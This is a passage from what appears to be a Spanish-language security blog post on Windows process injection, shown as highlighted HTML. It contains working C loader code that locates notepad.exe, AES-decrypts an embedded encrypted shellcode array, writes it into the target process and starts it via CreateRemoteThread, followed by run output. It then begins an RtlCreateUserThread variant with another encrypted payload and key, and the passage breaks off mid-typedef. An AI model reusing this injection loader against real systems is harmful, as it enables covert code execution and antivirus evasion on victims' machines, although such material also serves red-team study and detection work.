        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// Inyección tipo 1</span>
	<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Salida de la ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>external_injection_exe.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] svchost.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] NisSrv.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] svchost.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 2820
</code></pre></div></div>

<p>Evidencia de la inyección:</p>

<p><img src="/assets/images/inyeccion_proceso_externo.png" alt="inyección_proceso_externo" /></p>

<h4 id="prtlcreateuserthread">pRtlCreateUserThread()</h4>

<p>Inyección del tipo 2 desde un binario: pRtlCreateUserThread</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
